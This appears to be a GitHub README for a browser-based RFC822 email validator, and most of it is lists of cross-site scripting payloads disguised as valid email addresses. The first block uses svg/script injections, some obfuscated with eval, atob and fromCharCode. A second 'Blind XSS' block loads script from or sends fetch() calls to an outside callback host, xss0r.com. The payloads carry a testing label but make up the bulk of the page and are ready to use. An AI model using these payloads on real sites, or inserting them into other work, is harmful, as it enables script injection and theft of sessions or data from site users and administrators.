# RFC822 Email Validator
A sleek, browser-based tool for validating email addresses against the RFC822 standard. Built with HTML, CSS, and JavaScript — perfect for quick manual checks, demos, or client-side validation testing.

# Security Testing
Use this tool to test how email input fields handle potentially dangerous strings. Example payloads:
```
"><svg/onload=confirm(1337)>"@x.y
"><svg/onload=alert`XSS!`>"@x.y
"><svg><script>alert(48)</script>"@x.y
"><svg><title>1</title><script>alert(47)</script>"@x.y
"><svg/onload=eval('confirm(37)')>"@x.y
"><svg/onload=confirm?.(33)>"@x.y
"><math><mtext></title><script>confirm(31)</script>"@x.y
"><svg/onload=(confirm)(29)>"@x.y
"><script>setTimeout(()=>confirm(22))</script>"@x.y
"><svg/onload=Function('confirm(20)')()>"@x.y
"><svg/onload=eval(atob('Y29uZmlybSgxOSk='))>"@x.y
"><svg/onload=confirm(String.fromCharCode(49,56))>"@x.y
"><svg><foreignObject><script>confirm(15)</script></foreignObject></svg>"@x.y
"><svg/onload=alert(8)>"@x.y
"><math><mtext></title><script>confirm(6)</script>"@x.y
"><svg><script>confirm(4)</script>"@x.y
"><script>alert(3)</script>"@x.y
"><svg/onload=confirm(1)>"@x.y
```
Test Blind XSS payloads with RFC822 Email Validator for secure input validation. Example payloads:
```
%22%27%3E%3Cscript%3Ealert%281234567%29%3C%2Fscript%3E@x.y
ibro%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fbrocode%3E%3C%2Fscript%3E@xss0r.com
"'><svg/onload=fetch('https://xss0r.com/c/brocode')>"@x.y
"'><svg><script>fetch('https://xss0r.com/c/brocode')</script></svg>"@x.y
"'><script>fetch('https://xss0r.com/c/brocode')</script>"@x.y
```

Great for detecting weaknesses in forms, input sanitization, or frontend validation logic.

![RFC822 Email Validator](https://github.com/0xlipon/RFC822-Email-Validator/blob/main/RFC822.png?raw=true)

# Inspired By
Inspired by `@coffinxp/RFC822-Email-Validator` — now redefined for the web.
